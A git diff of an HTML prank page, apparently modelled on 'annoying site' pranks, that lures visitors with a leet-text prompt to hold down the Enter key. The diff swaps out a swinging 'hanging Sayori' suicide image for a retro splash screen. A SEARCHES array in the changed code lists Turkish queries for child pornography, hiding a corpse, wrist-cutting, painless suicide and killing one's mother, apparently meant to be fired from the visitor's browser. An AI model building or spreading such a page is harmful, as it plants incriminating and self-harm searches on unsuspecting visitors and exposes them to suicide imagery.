@@ -1,96 +1,90 @@
-<!DOCTYPE html>
 <html>
 <head>
-    <meta charset="utf-8">
-    <title>E</title>
-    <style>
-        body {
-            margin: 0;
-            overflow: hidden;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            background-color: #000000;
-        }
-        
-        .scene {
-            position: relative;
-            height: 100vh;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
-        
-        .sayori-container {
-            position: absolute;
-            top: 0; /* Position at the very top of the scene */
-            transform-origin: top center; /* Swing from the top */
-            z-index: 2;
-        }
-        
-        .sayori {
-            max-height: 80vh;
-            display: block;
-        }
-        
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <TITLE>E</TITLE>
 
-        .shadow {
-            position: absolute;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80px;
-            height: 20px;
-            background-color: rgba(45, 45, 45, 0.2);
-            border-radius: 50%;
-            filter: blur(5px);
-            z-index: 0;
-        }
-        .sayori {
-            filter: drop-shadow(0 0 0.75rem rgba(173, 173, 173, 0.248));
-}
-
-
-
-    </style>
 </head>
-<body>
-    <div class="scene">
-        <div class="shadow"></div>
-        <div class="sayori-container" id="sayoriContainer">
-            <img draggable="false" src="e.png" alt="Hanging sayori" class="sayori">
-        </div>
-    </div>
-    <audio autoplay="true" loop="true">
-        <source src="sex.ogg" type="audio/ogg"/>
-        <source src="sex.mp3" type="audio/mpeg"/>
-    </audio>
-    <script>
 
-        const sayoriContainer = document.getElementById('sayoriContainer');
+<body topmargin="0" bottommargin="100" leftmargin="0" rightmargin="0" background="bg104.gif">
 
-        const maxAngle = 5; 
-        const swingPeriod = 6000; 
-        const startTime = Date.now();
-        
-        function animate() {
+<audio src="https://dl.dropboxusercontent.com/u/20004444/beepbeep.wav" autoplay></audio>
 
-            const elapsed = Date.now() - startTime;
-            
-           
-            const progress = elapsed / swingPeriod;
-            const angle = maxAngle * Math.sin(2 * Math.PI * progress);
-            
+<style>
+  font1 {
+   position:absolute;
+   top: 5%;
+   left: 5%;
+}
+</style>
 
-            sayoriContainer.style.transform = `rotate(${angle}deg)`;
-            
+<style>
+  .leet-text {
+    font-size: 40px;
+    color: #c1b492;
+    background-color: #d2738a;
+    padding: 10px;
+    display: inline-block;
+    font-family: monospace;
+    cursor: pointer;
+    white-space: pre;
+  }
+</style>
 
-            requestAnimationFrame(animate);
-        }
-        
+<style>
+TEXT_MAIN {letter-spacing:3px;}
+</style>
 
-        animate();
-    </script>
+<style>
+  img {
+   position:absolute;
+   position:fixed;
+   bottom:-1px;
+   left: 75%;
+   width: 560px;
+   height: 500px;
+   margin-left: -280px;
+}
+</style>
+<style>
+                            @import url('https://fonts.cdnfonts.com/css/terminal');
+</style>
+                
+<style>         
+body  {                                                                  
+    font-family: 'Terminal', sans-serif;                                              
+    background-image: url('bg104.gif');
+    background-repeat: repeat;
+    background-attachment: fixed;
+}
+</style>
+
+<style type="text/css">
+body {cursor:url("/cursor.gif"), auto;}
+</style>
+
+<style type="text/css">
+a {cursor:url("/cursor2.gif"), default;}
+</style>
+
+<TEXT_MAIN>
+<br>
+<font1>
+  <font size="40" font color="#c1b492">
+    <mark style="background-color:d2738a;">
+      <br><span id="leetText">Hello th3re.</span>
+  </font>
+  <br><br>
+  <font font size="3" font color="#c1b492">
+    <mark style="background-color:d2738a;">
+      <br><br>H0ld down th3 ent3r key f0r 3 seconds to st4rt.<br><br>
+  </font>
+</font1>
+<br><br>
+</TEXT_MAIN>
+
+<br><br><br><br><br><br><br><br>
+<img draggable="false" border="0" src="404_2.gif" alt="LoveLain" width="560" height="500"></a>
     <script async src='https://www.googletagmanager.com/gtag/js?id=UA-3898076-24'></script>
     <script>
       window.dataLayer = window.dataLayer || []
@@ -141,9 +135,9 @@
         ]
         
         const SEARCHES = [
-          'childporn',
-          'turkay eren cagri',
-          'ceset nasi saklanir',
+          'nasi ceset saklayabilirim',
+          'suicide',
+          'cocukpornosu',
           'bilek kesme tutorial',
           'aci cekmeden nasi olebilirim',
           'annem uyurken onu nasi oldururum',
@@ -1246,5 +1240,58 @@ function detectBrowser () {
   }
 }
     </script>
+<script>
+  const targetText = "Hello th3re.";
+  const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()[]{}<>?/\\|";
+  const textElement = document.getElementById("leetText");
+  let interval;
+  let isDecoded = false;  // Yeni bir flag, metnin çözüldüğünü belirtecek
+
+  function getRandomChar() {
+    return characters[Math.floor(Math.random() * characters.length)];
+  }
+
+  function generateRandomString(length) {
+    return Array.from({ length }, getRandomChar).join('');
+  }
+
+  function decodeText() {
+    let revealed = 0;
+
+    clearInterval(interval);
+
+    interval = setInterval(() => {
+      let displayText = "";
+
+      for (let i = 0; i < targetText.length; i++) {
+        if (i < revealed) {
+          displayText += targetText[i];
+        } else {
+          displayText += getRandomChar();
+        }
+      }
+
+      textElement.textContent = displayText;
+
+      if (revealed < targetText.length) {
+        revealed++;
+      } else {
+        clearInterval(interval);
+        isDecoded = true;  // Metin çözüldü, flag'i güncelle
+      }
+    }, 60);
+  }
+
+  // Sayfa yüklendiğinde animasyonu başlat
+  window.addEventListener("load", () => {
+    textElement.textContent = targetText;
+
+    setTimeout(() => {
+      decodeText();  // 1 saniye sonra animasyon başlasın
+    }, 10);
+  });
+
+</script>
+
 </body>
 </html>
